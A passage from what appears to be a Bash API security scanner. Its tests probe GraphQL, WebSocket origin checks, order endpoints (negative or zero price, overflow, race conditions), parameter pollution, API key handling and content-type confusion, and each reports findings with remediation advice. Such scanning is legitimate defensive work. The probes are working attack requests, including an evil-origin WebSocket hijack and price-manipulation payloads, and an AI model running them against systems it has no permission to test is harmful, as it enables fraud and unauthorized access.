    echo "[T02] Depth response: ${depth_body:0:300}" >> "$evfile"

    if [[ "$depth_code" == "200" ]] && ! echo "$depth_body" | grep -qi '"errors"\|depth\|limit\|complexity'; then
        emit_finding "high" \
            "GraphQL Query Depth Limit Not Enforced (${ip}:${port})" \
            "GraphQL endpoint ${_GQL_ENDPOINT} accepted an 8-level deeply nested query without returning a depth-limit error. Uncontrolled query depth enables DoS via exponential resolver fan-out and can expose deeply related data objects not intended for direct access." \
            "Configure a maximum query depth (recommended: 5-7 levels). Use graphql-depth-limit (Node.js), Graphene's depth validator, or Apollo Server's validationRules to reject deep queries before execution." \
            "ev-24-${ip//./_}-t02-depth"
    fi
    _tier_sleep

    # Attack 3: Field suggestion extraction (schema enum via typo)
    local sug_resp
    sug_resp=$(_curl -X POST -H "Content-Type: application/json" \
        -d '{"query":"{usr{identificacion}}"}' "${_GQL_ENDPOINT}" || true)
    echo "[T02] Field suggestion probe: ${sug_resp:0:400}" >> "$evfile"

    if echo "$sug_resp" | grep -qi '"Did you mean"\|"suggestions"\|did_you_mean'; then
        emit_finding "medium" \
            "GraphQL Field Suggestion Leaks Internal Schema Identifiers (${ip}:${port})" \
            "GraphQL endpoint ${_GQL_ENDPOINT} returned field name suggestions in error responses (e.g., 'Did you mean user?'). Even with introspection disabled, suggestion messages enumerate type names and field identifiers, allowing progressive schema reconstruction without a formal introspection query." \
            "Disable field suggestions in production. In Apollo Server set 'suggestions: false'. In other implementations, suppress error messages that include type/field name hints. Return generic 'field not found' errors instead." \
            "ev-24-${ip//./_}-t02-suggestion"
    fi
    _tier_sleep

    # Attack 4: Subscription endpoint discovery
    local sub_paths=("${base_url}/subscriptions" "${base_url}/graphql-subscription"
                     "${base_url}/ws"            "${base_url}/graphql-ws")
    for sp in "${sub_paths[@]}"; do
        local sub_code
        sub_code=$(_curl_ws -H "Upgrade: websocket" -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
            -H "Sec-WebSocket-Version: 13" \
            -o /dev/null -w "%{http_code}" "$sp" || true)
        echo "[T02] Subscription probe ${sp}: HTTP ${sub_code}" >> "$evfile"
        if [[ "$sub_code" == "101" ]]; then
            emit_finding "info" \
                "GraphQL Subscription Endpoint Detected (${ip}:${port})" \
                "A GraphQL subscription endpoint was found at ${sp} (HTTP 101 Switching Protocols). Subscription endpoints may have weaker authentication than the main GraphQL endpoint and can expose real-time data streams. Test for authentication bypass and data scope issues separately." \
                "Ensure subscription endpoints enforce the same authentication and authorization as the main GraphQL endpoint. Implement per-subscription authorization checks for all subscribed data fields." \
                "ev-24-${ip//./_}-t02-subscription"
            break
        fi
    done
    _tier_sleep

    # Attack 5: Persisted query abuse (send unknown hash → check if server fetches or blindly executes)
    local pq_resp pq_code
    pq_resp=$(_curl -X POST -H "Content-Type: application/json" \
        -d '{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"0000000000000000000000000000000000000000000000000000000000000001"}}}' \
        -w "\n%{http_code}" "${_GQL_ENDPOINT}" || true)
    pq_code=$(echo "$pq_resp" | tail -1)
    local pq_body; pq_body=$(echo "$pq_resp" | head -n -1)
    echo "[T02] Persisted query probe: HTTP ${pq_code} body=${pq_body:0:200}" >> "$evfile"

    if [[ "$pq_code" == "200" ]] && ! echo "$pq_body" | grep -qi '"PersistedQueryNotFound"\|"PersistedQueryNotSupported"\|"errors"'; then
        emit_finding "medium" \
            "GraphQL Automatic Persisted Query — Unexpected Acceptance of Unknown Hash (${ip}:${port})" \
            "GraphQL endpoint ${_GQL_ENDPOINT} returned HTTP 200 without a PersistedQueryNotFound error when sent an unknown APQ sha256 hash. This may indicate the server executes cached queries without verifying the hash, or that the APQ implementation has a bypass condition." \
            "Verify that the APQ implementation correctly returns PersistedQueryNotFound for unknown hashes and requires the full query document on retry. Audit the APQ cache for injection of malicious queries via hash collision." \
            "ev-24-${ip//./_}-t02-apq"
    fi

    log_ok "T02: GraphQL advanced probes complete against ${_GQL_ENDPOINT}"
}

# =============================================================================
# MRK:15_T03 — T03 WEBSOCKET ATTACKS | t03,websocket,cswsh,origin,ws | L691-790
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t03_websocket() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t03-websocket" "txt")"
    log "T03: WebSocket Attacks — ${base_url}"
    _SUMMARY_WS=0

    # Common WS paths to probe
    local ws_paths=("/ws" "/websocket" "/socket.io" "/socket" "/live"
                    "/realtime" "/ws/v1" "/api/ws" "/ws/chat"
                    "/ws/notifications" "/cable" "/events")

    local ws_ep="" ws_plain_ep=""
    local scheme; scheme=$(_scheme "$port")

    for path in "${ws_paths[@]}"; do
        local code
        code=$(_curl_ws \
            -H "Upgrade: websocket" \
            -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
            -H "Sec-WebSocket-Version: 13" \
            -H "Origin: ${base_url}" \
            -o /dev/null -w "%{http_code}" "${base_url}${path}" || true)
        echo "[T03] WS probe ${path}: HTTP ${code}" >> "$evfile"
        if [[ "$code" == "101" ]]; then
            ws_ep="${base_url}${path}"
            _WS_ENDPOINT="$ws_ep"
            log_info "T03: WebSocket endpoint found: ${ws_ep}"
            emit_finding "info" \
                "WebSocket Endpoint Detected — ${path} (${ip}:${port})" \
                "A WebSocket upgrade was accepted at ${ws_ep} (HTTP 101 Switching Protocols). WebSocket endpoints are common targets for cross-site hijacking, authentication bypass, and message injection attacks." \
                "Ensure the WebSocket endpoint enforces authentication tokens on the initial handshake and validates the Origin header against an allow-list." \
                "ev-24-${ip//./_}-t03-ws-found"
            break
        fi
    done

    if [[ -z "$ws_ep" ]]; then
        log_ok "T03: No WebSocket endpoint found — skipping WS attack tests"
        return
    fi
    _SUMMARY_WS=1

    # Attack 1: Cross-Site WebSocket Hijacking (CSWSH) — evil origin
    local cswsh_code
    cswsh_code=$(_curl_ws \
        -H "Upgrade: websocket" \
        -H "Connection: Upgrade" \
        -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
        -H "Sec-WebSocket-Version: 13" \
        -H "Origin: https://evil-probe.invalid" \
        -o /dev/null -w "%{http_code}" "${ws_ep}" || true)
    echo "[T03] CSWSH probe (evil origin): HTTP ${cswsh_code}" >> "$evfile"

    if [[ "$cswsh_code" == "101" ]]; then
        emit_finding "high" \
            "Cross-Site WebSocket Hijacking (CSWSH) — Origin Not Validated (${ip}:${port})" \
            "WebSocket endpoint ${ws_ep} accepted an upgrade request with Origin: https://evil-probe.invalid and returned HTTP 101. Without Origin validation, a malicious page can initiate a WebSocket connection from a victim's browser using their session cookies, reading and sending messages as the victim." \
            "Validate the Origin header on every WebSocket upgrade request against a strict server-side allowlist. Reject connections from origins not on the list with HTTP 403. Do not rely solely on CORS for WebSocket security." \
            "ev-24-${ip//./_}-t03-cswsh"
    fi
    _tier_sleep

    # Attack 2: WebSocket auth bypass — no credentials on upgrade
    local noauth_code
    noauth_code=$(_curl_ws \
        -H "Upgrade: websocket" \
        -H "Connection: Upgrade" \
        -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
        -H "Sec-WebSocket-Version: 13" \
        -H "Origin: ${base_url}" \
        -o /dev/null -w "%{http_code}" "${ws_ep}" || true)
    echo "[T03] WS no-auth probe: HTTP ${noauth_code}" >> "$evfile"

    # If we have a token, compare authed vs unauthed; if no token, flag 101 without auth header
    if [[ "$noauth_code" == "101" ]] && [[ -z "${BEARER_TOKEN:-}" ]]; then
        emit_finding "medium" \
            "WebSocket Endpoint Accessible Without Authentication Token (${ip}:${port})" \
            "WebSocket endpoint ${ws_ep} accepted the upgrade handshake without any Authorization header or token parameter. If this endpoint handles sensitive real-time data, unauthenticated clients may be able to connect and receive or send messages." \
            "Require a signed, time-limited token (e.g., a one-time handshake token or JWT query parameter) on WebSocket upgrade requests. Validate the token server-side before completing the 101 handshake." \
            "ev-24-${ip//./_}-t03-ws-noauth"
    fi
    _tier_sleep

    # Attack 3: Unencrypted WS on HTTPS target
    if [[ "$scheme" == "https" ]]; then
        local plain_url="http://${ip}:${port}"
        local plain_code
        plain_code=$(_curl_ws \
            -H "Upgrade: websocket" \
            -H "Connection: Upgrade" \
            -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
            -H "Sec-WebSocket-Version: 13" \
            -H "Origin: http://${ip}:${port}" \
            -o /dev/null -w "%{http_code}" "${plain_url}${path:-/ws}" || true)
        echo "[T03] Plaintext WS probe on HTTPS target: HTTP ${plain_code}" >> "$evfile"
        if [[ "$plain_code" == "101" ]]; then
            emit_finding "medium" \
                "WebSocket Accepts Unencrypted ws:// on HTTPS Host (${ip}:${port})" \
                "An HTTPS target at ${base_url} accepted a plain-text WebSocket (ws://) upgrade on port ${port}. This allows network observers to intercept WebSocket traffic in clear text, negating TLS protection on the host." \
                "Reject plain ws:// connections on HTTPS servers. Redirect ws:// to wss:// or return HTTP 403 on unencrypted upgrade requests. Ensure the web server does not listen on separate plain-text ports for WebSocket traffic." \
                "ev-24-${ip//./_}-t03-ws-plain"
        fi
    fi

    log_ok "T03: WebSocket attack probes complete"
}

# =============================================================================
# MRK:15_T04 — T04 BUSINESS LOGIC DEEP | t04,business,logic,price,race | L791-910
# NAV-RULE: read-toc-first; deep-only
# =============================================================================

test_15_t04_bizlogic() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t04-bizlogic" "txt")"
    log "T04: Business Logic Deep — ${base_url}"
    _SUMMARY_BIZ=0

    # Candidate business logic endpoints
    local biz_candidates=()
    [[ -n "${BUSINESS_EP:-}" ]] && biz_candidates+=("${base_url}${BUSINESS_EP}")
    biz_candidates+=(
        "${base_url}${API_BASE}/order"     "${base_url}${API_BASE}/orders"
        "${base_url}${API_BASE}/purchase"  "${base_url}${API_BASE}/checkout"
        "${base_url}${API_BASE}/cart"      "${base_url}${API_BASE}/payment"
        "${base_url}${API_BASE}/transfer"  "${base_url}${API_BASE}/withdraw"
        "${base_url}${API_BASE}/redeem"    "${base_url}${API_BASE}/apply-coupon"
    )

    # Guard: find a reachable endpoint before sending invasive payloads
    local biz_ep=""
    for ep in "${biz_candidates[@]}"; do
        local guard_code
        guard_code=$(_curl -X HEAD -o /dev/null -w "%{http_code}" "$ep" || true)
        echo "[T04] Guard probe ${ep}: HTTP ${guard_code}" >> "$evfile"
        if [[ "$guard_code" =~ ^(200|201|400|401|403|405|422)$ ]]; then
            biz_ep="$ep"
            log_info "T04: Business endpoint candidate: ${biz_ep} (HTTP ${guard_code})"
            break
        fi
    done

    if [[ -z "$biz_ep" ]]; then
        log_ok "T04: No reachable business logic endpoint found — skipping"
        return
    fi

    local -a auth_args=(); mapfile -t auth_args < <(_auth_args)

    # Attack 1: Negative price
    local neg_price_resp neg_price_code
    neg_price_resp=$(_curl -X POST -H "Content-Type: application/json" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '{"price":-1,"quantity":1,"product_id":"test-probe-item"}' \
        -w "\n%{http_code}" "$biz_ep" || true)
    neg_price_code=$(echo "$neg_price_resp" | tail -1)
    local neg_price_body; neg_price_body=$(echo "$neg_price_resp" | head -n -1)
    echo "[T04] Negative price probe: HTTP ${neg_price_code} body=${neg_price_body:0:300}" >> "$evfile"

    if [[ "$neg_price_code" =~ ^(200|201)$ ]] && \
       echo "$neg_price_body" | grep -qi '"id"\|"order_id"\|"transaction_id"\|"success"'; then
        _SUMMARY_BIZ=1
        emit_finding "high" \
            "Business Logic — Negative Price Accepted in Order Endpoint (${ip}:${port})" \
            "Order endpoint ${biz_ep} accepted a POST with price:-1 and returned HTTP ${neg_price_code} with a success or order ID. A negative price could result in a credit balance, negative total, or free/discounted purchase depending on the backend calculation." \
            "Validate all monetary fields server-side: enforce price >= 0 and quantity >= 1 with hard type checks. Never trust client-supplied prices — compute the final price server-side from the product catalog. Apply the same validation for discount and tax fields." \
            "ev-24-${ip//./_}-t04-negprice"
    fi
    _tier_sleep

    # Attack 2: Negative quantity
    local neg_qty_resp neg_qty_code
    neg_qty_resp=$(_curl -X POST -H "Content-Type: application/json" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '{"price":10,"quantity":-1,"product_id":"test-probe-item"}' \
        -w "\n%{http_code}" "$biz_ep" || true)
    neg_qty_code=$(echo "$neg_qty_resp" | tail -1)
    echo "[T04] Negative quantity probe: HTTP ${neg_qty_code}" >> "$evfile"

    if [[ "$neg_qty_code" =~ ^(200|201)$ ]] && \
       echo "$(echo "$neg_qty_resp" | head -n -1)" | grep -qi '"id"\|"order_id"\|"success"'; then
        _SUMMARY_BIZ=1
        emit_finding "high" \
            "Business Logic — Negative Quantity Accepted in Order Endpoint (${ip}:${port})" \
            "Order endpoint ${biz_ep} accepted quantity:-1. Negative quantities can invert total calculations, creating negative invoices or triggering a refund/credit to the attacker's account depending on financial processing logic." \
            "Enforce quantity >= 1 server-side. Use unsigned integer types for all quantity fields in the database schema. Reject negative or zero quantities with HTTP 400 before any financial calculation is performed." \
            "ev-24-${ip//./_}-t04-negqty"
    fi
    _tier_sleep

    # Attack 3: Zero price
    local zero_price_resp zero_code
    zero_price_resp=$(_curl -X POST -H "Content-Type: application/json" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '{"price":0,"quantity":1,"product_id":"test-probe-item"}' \
        -w "\n%{http_code}" "$biz_ep" || true)
    zero_code=$(echo "$zero_price_resp" | tail -1)
    echo "[T04] Zero price probe: HTTP ${zero_code}" >> "$evfile"

    if [[ "$zero_code" =~ ^(200|201)$ ]] && \
       echo "$(echo "$zero_price_resp" | head -n -1)" | grep -qi '"id"\|"order_id"\|"success"'; then
        _SUMMARY_BIZ=1
        emit_finding "high" \
            "Business Logic — Zero Price Accepted — Free Purchase Possible (${ip}:${port})" \
            "Order endpoint ${biz_ep} processed a transaction with price:0 and returned success. An attacker can purchase items at zero cost by manipulating the price field in the request body." \
            "Never accept client-submitted prices. Compute final prices entirely server-side using the product ID to look up the canonical price in the catalog. Treat any client-supplied price field as advisory at most, validating it matches the server value." \
            "ev-24-${ip//./_}-t04-zeroprice"
    fi
    _tier_sleep

    # Attack 4: Integer overflow in amount field
    local overflow_resp overflow_code
    overflow_resp=$(_curl -X POST -H "Content-Type: application/json" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '{"amount":99999999999999,"quantity":1,"product_id":"test-probe-item"}' \
        -w "\n%{http_code}" "$biz_ep" || true)
    overflow_code=$(echo "$overflow_resp" | tail -1)
    local overflow_body; overflow_body=$(echo "$overflow_resp" | head -n -1)
    echo "[T04] Integer overflow probe: HTTP ${overflow_code} body=${overflow_body:0:200}" >> "$evfile"

    if [[ "$overflow_code" =~ ^(200|201)$ ]]; then
        _SUMMARY_BIZ=1
        emit_finding "medium" \
            "Business Logic — Extremely Large Amount Accepted Without Validation (${ip}:${port})" \
            "Order endpoint ${biz_ep} accepted amount:99999999999999 (15 digits) with HTTP ${overflow_code}. Extremely large values can trigger integer overflow in fixed-precision arithmetic, resulting in sign flip, wrap-around, or database storage truncation — potentially resulting in a near-zero or negative effective amount." \
            "Define and enforce maximum value bounds on all monetary and quantity fields. Use server-side validation to reject values outside the expected business range. Use arbitrary-precision arithmetic libraries for financial calculations to avoid overflow." \
            "ev-24-${ip//./_}-t04-overflow"
    fi
    _tier_sleep

    # Attack 5: Race condition — 5 parallel requests to the same endpoint
    log_info "T04: Race condition probe — 5 parallel requests to ${biz_ep}"
    local race_dir; race_dir=$(mktemp -d)
    local race_payload='{"price":0.01,"quantity":1,"product_id":"test-probe-item","race_probe":"true"}'
    for i in $(seq 1 5); do
        ( _curl -X POST -H "Content-Type: application/json" \
            "${auth_args[@]+"${auth_args[@]}"}" \
            -d "$race_payload" -o "${race_dir}/r${i}.json" -w "%{http_code}" \
            "$biz_ep" > "${race_dir}/code${i}.txt" 2>/dev/null ) &
    done
    wait

    local success_count=0
    for i in $(seq 1 5); do
        local rcode=""; [[ -f "${race_dir}/code${i}.txt" ]] && rcode=$(cat "${race_dir}/code${i}.txt" || true)
        local rbody=""; [[ -f "${race_dir}/r${i}.json" ]]  && rbody=$(cat "${race_dir}/r${i}.json"  || true)
        echo "[T04] Race result ${i}: HTTP ${rcode} body=${rbody:0:150}" >> "$evfile"
        if [[ "$rcode" =~ ^(200|201)$ ]] && echo "$rbody" | grep -qi '"id"\|"order_id"\|"success"'; then
            (( success_count++ )) || true
        fi
    done
    rm -rf "$race_dir"

    if [[ "$success_count" -ge 2 ]]; then
        _SUMMARY_BIZ=1
        emit_finding "high" \
            "Business Logic — Race Condition Allows Duplicate Order Processing (${ip}:${port})" \
            "${success_count} of 5 simultaneous POST requests to ${biz_ep} all returned success responses with order IDs. Without idempotency controls or mutex locking, concurrent requests can be processed independently, potentially allowing double-spend, duplicate coupon redemption, or inventory bypass." \
            "Implement idempotency keys on all mutating order/payment endpoints. Use database-level transactions with serializable isolation for financial operations. Apply optimistic or pessimistic locking on inventory and balance records. Rate-limit per-user order submissions." \
            "ev-24-${ip//./_}-t04-race"
    fi

    [[ "${_SUMMARY_BIZ}" -eq 0 ]] && log_ok "T04: No business logic vulnerabilities confirmed"
}

# =============================================================================
# MRK:15_T05 — T05 HTTP PARAMETER POLLUTION | t05,hpp,duplicate,array | L911-995
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t05_hpp() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t05-hpp" "txt")"
    log "T05: HTTP Parameter Pollution — ${base_url}"
    _SUMMARY_HPP=0

    local api_ep="${base_url}${API_BASE}"
    local -a auth_args=(); mapfile -t auth_args < <(_auth_args)

    # Find a valid GET endpoint to test against
    local test_paths=("${api_ep}/users" "${api_ep}/items" "${api_ep}/products"
                      "${api_ep}/search" "${api_ep}/data" "${api_ep}/resources")
    local test_ep=""
    for path in "${test_paths[@]}"; do
        local code; code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" -o /dev/null -w "%{http_code}" "$path" || true)
        if [[ "$code" =~ ^(200|400)$ ]]; then
            test_ep="$path"
            log_info "T05: HPP test endpoint: ${test_ep}"
            break
        fi
    done

    # Attack 1: Duplicate query parameters
    if [[ -n "$test_ep" ]]; then
        local baseline_resp; baseline_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${test_ep}?id=1" || true)
        local hpp_resp;      hpp_resp=$(_curl      "${auth_args[@]+"${auth_args[@]}"}" "${test_ep}?id=1&id=2" || true)
        echo "[T05] HPP baseline len=${#baseline_resp} duplicated len=${#hpp_resp}" >> "$evfile"
        echo "[T05] HPP response sample: ${hpp_resp:0:300}" >> "$evfile"

        if [[ "${#baseline_resp}" -ne "${#hpp_resp}" ]] && [[ -n "$hpp_resp" ]]; then
            _SUMMARY_HPP=1
            emit_finding "medium" \
                "HTTP Parameter Pollution — Duplicate Query Parameters Alter Response (${ip}:${port})" \
                "Endpoint ${test_ep} returned a different response body length when the 'id' parameter was duplicated (?id=1&id=2) vs. a single value (?id=1). Depending on which value the backend uses (first, last, or both), an attacker may be able to override security controls or inject unintended parameter values." \
                "Reject or explicitly define how duplicate query parameters are handled. Use a strict parameter parsing layer that either takes the first, last, or rejects duplicates. Document and enforce the expected parameter cardinality in your API schema." \
                "ev-24-${ip//./_}-t05-hpp-qs"
        fi
        _tier_sleep
    fi

    # Attack 2: JSON array injection on a resource endpoint
    local arr_targets=("${api_ep}/users" "${api_ep}/items" "${api_ep}/lookup")
    for ep in "${arr_targets[@]}"; do
        local arr_code
        arr_code=$(_curl -X POST -H "Content-Type: application/json" \
            "${auth_args[@]+"${auth_args[@]}"}" \
            -d '{"id":["1","2","3","4","5"]}' \
            -o /dev/null -w "%{http_code}" "$ep" || true)
        local arr_resp
        arr_resp=$(_curl -X POST -H "Content-Type: application/json" \
            "${auth_args[@]+"${auth_args[@]}"}" \
            -d '{"id":["1","2","3","4","5"]}' "$ep" || true)
        echo "[T05] JSON array injection ${ep}: HTTP ${arr_code} resp=${arr_resp:0:300}" >> "$evfile"

        if [[ "$arr_code" == "200" ]] && \
           echo "$arr_resp" | python3 -c "import sys,json; d=json.load(sys.stdin); exit(0 if isinstance(d,list) and len(d)>1 else 1)" 2>/dev/null; then
            _SUMMARY_HPP=1
            emit_finding "medium" \
                "JSON Array Injection — Multiple Records Returned for Array ID Input (${ip}:${port})" \
                "Endpoint ${ep} accepted a JSON body with id as an array ([\"1\",\"2\",\"3\",\"4\",\"5\"]) and returned multiple records. This can be used to fetch multiple objects in one request, bypassing per-object access controls or rate limits intended for single-record fetches." \
                "Validate that scalar fields (id, user_id, etc.) only accept scalar values. Reject requests where a scalar field contains an array. Implement per-field type validation in your request schema." \
                "ev-24-${ip//./_}-t05-array"
            break
        fi
        _tier_sleep
    done

    # Attack 3: PHP-style array params (?ids[]=1&ids[]=2)
    if [[ -n "$test_ep" ]]; then
        local php_resp php_code
        php_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${test_ep}?ids[]=1&ids[]=2&ids[]=3" || true)
        php_code=$(_curl "${auth_args[@]+"${auth_args[@]}"}" -o /dev/null -w "%{http_code}" "${test_ep}?ids[]=1&ids[]=2&ids[]=3" || true)
        echo "[T05] PHP-array QS: HTTP ${php_code} resp=${php_resp:0:200}" >> "$evfile"

        if [[ "$php_code" == "200" ]] && \
           echo "$php_resp" | grep -qP '"\d+"\s*:\s*\{|\[\{.*\}\]' 2>/dev/null; then
            _SUMMARY_HPP=1
            emit_finding "medium" \
                "HTTP Parameter Pollution — PHP-Style Array Parameters Accepted (${ip}:${port})" \
                "Endpoint ${test_ep} accepted PHP-style array query parameters (ids[]=1&ids[]=2) and returned multiple records. This pattern can bypass per-resource authorization if the backend iterates the array without checking each element against the authenticated user's scope." \
                "Validate query string parameter types on the server side. Reject parameters that use bracket notation for fields expected to be scalar. Use a strict query parsing configuration that does not interpret bracket notation as arrays." \
                "ev-24-${ip//./_}-t05-php-array"
        fi
    fi

    [[ "${_SUMMARY_HPP}" -eq 0 ]] && log_ok "T05: No HTTP parameter pollution vulnerabilities confirmed"
}

# =============================================================================
# MRK:15_T06 — T06 API KEY SECURITY | t06,apikey,entropy,url,scope | L996-1080
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t06_apikey() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t06-apikey" "txt")"
    log "T06: API Key Security — ${base_url}"
    _SUMMARY_APIKEY=0

    local api_ep="${base_url}${API_BASE}"

    # Check 1: Weak entropy on provided API key
    if [[ -n "${API_KEY:-}" ]]; then
        local key_len="${#API_KEY}"
        echo "[T06] Provided API key length: ${key_len}" >> "$evfile"
        if [[ "$key_len" -lt 16 ]]; then
            _SUMMARY_APIKEY=1
            emit_finding "high" \
                "API Key Weak Entropy — Key Length Below 16 Characters (${ip}:${port})" \
                "The provided API key is only ${key_len} characters long. Short API keys have insufficient entropy for brute-force resistance. An attacker with knowledge of the key format can enumerate possible values offline or via targeted API requests." \
                "Generate API keys using a cryptographically secure random number generator with at least 128 bits of entropy (32 hex characters or 22+ base64url characters). Implement rate limiting and IP-based lockout on authentication endpoints." \
                "ev-24-${ip//./_}-t06-entropy"
        fi

        # Check for low character diversity (all same char class or sequential)
        local unique_chars; unique_chars=$(echo -n "$API_KEY" | fold -w1 | sort -u | wc -l)
        echo "[T06] Unique characters in key: ${unique_chars}" >> "$evfile"
        if [[ "$unique_chars" -lt 4 ]]; then
            _SUMMARY_APIKEY=1
            emit_finding "high" \
                "API Key Low Character Diversity — Likely Predictable Pattern (${ip}:${port})" \
                "The provided API key uses only ${unique_chars} distinct characters, suggesting a low-entropy or sequential generation pattern. Keys with low character diversity are vulnerable to targeted brute-force or pattern-based guessing attacks." \
                "Use a CSPRNG (e.g., /dev/urandom, crypto.randomBytes) to generate keys from a full alphanumeric + symbol character set. Avoid sequential, timestamp-derived, or user-data-derived keys." \
                "ev-24-${ip//./_}-t06-diversity"
        fi
    fi

    # Check 2: API key accepted in URL query string
    local url_key_names=("api_key" "apiKey" "apikey" "access_token" "token" "key" "auth")
    for key_name in "${url_key_names[@]}"; do
        local url_code url_resp
        url_code=$(_curl -o /dev/null -w "%{http_code}" \
            "${api_ep}/data?${key_name}=probe_key_test_apideep_24" || true)
        url_resp=$(_curl "${api_ep}/data?${key_name}=probe_key_test_apideep_24" || true)
        echo "[T06] URL key probe ${key_name}: HTTP ${url_code}" >> "$evfile"

        if [[ "$url_code" =~ ^(200|201|400)$ ]] && \
           ! echo "$url_resp" | grep -qi '"invalid"\|"unauthorized"\|"forbidden"\|"not found"'; then
            _SUMMARY_APIKEY=1
            emit_finding "medium" \
                "API Key Accepted in URL Query Parameter — Key Exposed in Logs (${ip}:${port})" \
                "The API endpoint accepted ${key_name} as a URL query parameter (e.g., ?${key_name}=...) and did not reject it with an authentication error. Placing API keys in URLs exposes them in server access logs, browser history, Referer headers, and proxy logs — all of which are commonly logged in plain text." \
                "Require API keys to be passed exclusively in the Authorization header or a custom header (e.g., X-API-Key). Return HTTP 400 or 401 for requests that supply the key as a query parameter. Document this requirement in your API specification." \
                "ev-24-${ip//./_}-t06-url-key"
            break
        fi
    done
    _tier_sleep

    # Check 3: API key leaked in response body
    local -a auth_args=(); mapfile -t auth_args < <(_auth_args)
    local profile_paths=("${api_ep}/me" "${api_ep}/profile" "${api_ep}/account"
                         "${api_ep}/user" "${api_ep}/settings" "${api_ep}/config")
    for path in "${profile_paths[@]}"; do
        local resp; resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "$path" || true)
        echo "[T06] Profile path ${path}: ${resp:0:200}" >> "$evfile"
        if echo "$resp" | grep -qi '"api_key"\|"apiKey"\|"api_token"\|"secret_key"'; then
            _SUMMARY_APIKEY=1
            emit_finding "high" \
                "API Key Exposed in Response Body — Credential Leakage (${ip}:${port})" \
                "Endpoint ${base_url}${path} returned a response containing an api_key, apiKey, or similar credential field in the response body. Returning secrets in API responses risks exposure in logs, browser DevTools, and intermediary systems." \
                "Never return API keys, secrets, or tokens in response bodies except at the moment of key creation. Mask or omit credential fields from GET /profile or /account responses. If the key must be shown, display only the last 4 characters." \
                "ev-24-${ip//./_}-t06-leak"
            break
        fi
    done

    [[ "${_SUMMARY_APIKEY}" -eq 0 ]] && log_ok "T06: No API key security issues detected"
}

# =============================================================================
# MRK:15_T07 — T07 CONTENT-TYPE CONFUSION | t07,ctype,xml,form,mime | L1081-1155
# NAV-RULE: read-toc-first
# =============================================================================

test_15_t07_ctype() {
    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
    local evfile="${ev_dir}/$(ev_fname "apideep-t07-ctype" "txt")"
    log "T07: Content-Type Confusion — ${base_url}"
    _SUMMARY_CTYPE=0

    local api_ep="${base_url}${API_BASE}"
    local -a auth_args=(); mapfile -t auth_args < <(_auth_args)

    # Find a writable API endpoint (accepts POST with JSON)
    local write_paths=("${api_ep}/users" "${api_ep}/data" "${api_ep}/items"
                       "${api_ep}/messages" "${api_ep}/resources" "${api_ep}/search")
    local write_ep=""
    for path in "${write_paths[@]}"; do
        local code; code=$(_curl -X POST -H "Content-Type: application/json" \
            "${auth_args[@]+"${auth_args[@]}"}" \
            -d '{"test":"probe"}' -o /dev/null -w "%{http_code}" "$path" || true)
        echo "[T07] Write EP probe ${path}: HTTP ${code}" >> "$evfile"
        if [[ "$code" =~ ^(200|201|400|401|403|422)$ ]]; then
            write_ep="$path"
            log_info "T07: Content-type test endpoint: ${write_ep}"
            break
        fi
    done

    [[ -z "$write_ep" ]] && { log_ok "T07: No writable API endpoint found"; return; }

    # Test 1: Switch JSON body to application/xml
    local xml_code xml_resp
    xml_code=$(_curl -X POST -H "Content-Type: application/xml" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '<request><action>probe_ctype</action><admin>true</admin></request>' \
        -o /dev/null -w "%{http_code}" "$write_ep" || true)
    xml_resp=$(_curl -X POST -H "Content-Type: application/xml" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d '<request><action>probe_ctype</action><admin>true</admin></request>' \
        "$write_ep" || true)
    echo "[T07] XML body probe: HTTP ${xml_code} resp=${xml_resp:0:300}" >> "$evfile"

    if [[ "$xml_code" =~ ^(200|201)$ ]] && ! echo "$xml_resp" | grep -qi '"error"\|"invalid"\|"unsupported"'; then
        _SUMMARY_CTYPE=1
        emit_finding "medium" \
            "Content-Type Confusion — XML Body Accepted on JSON API Endpoint (${ip}:${port})" \
            "API endpoint ${write_ep} accepted a request with Content-Type: application/xml and returned HTTP ${xml_code} without an error. If the backend switches parsers based on Content-Type without strict allowlisting, an attacker can use XML encoding to bypass JSON-specific WAF rules, input validation filters, or JSON schema validation." \
            "Implement a strict Content-Type allowlist on all API endpoints. Return HTTP 415 (Unsupported Media Type) for any Content-Type not explicitly supported. Do not auto-detect or fall back to alternative parsers based on the request body." \
            "ev-24-${ip//./_}-t07-xml"
    fi
    _tier_sleep

    # Test 2: Switch to application/x-www-form-urlencoded
    local form_code form_resp
    form_code=$(_curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d "action=probe_ctype&admin=true&role=superadmin" \
        -o /dev/null -w "%{http_code}" "$write_ep" || true)
    form_resp=$(_curl -X POST -H "Content-Type: application/x-www-form-urlencoded" \
        "${auth_args[@]+"${auth_args[@]}"}" \
        -d "action=probe_ctype&admin=true&role=superadmin" \
        "$write_ep" || true)
    echo "[T07] Form-encoded probe: HTTP ${form_code} resp=${form_resp:0:300}" >> "$evfile"

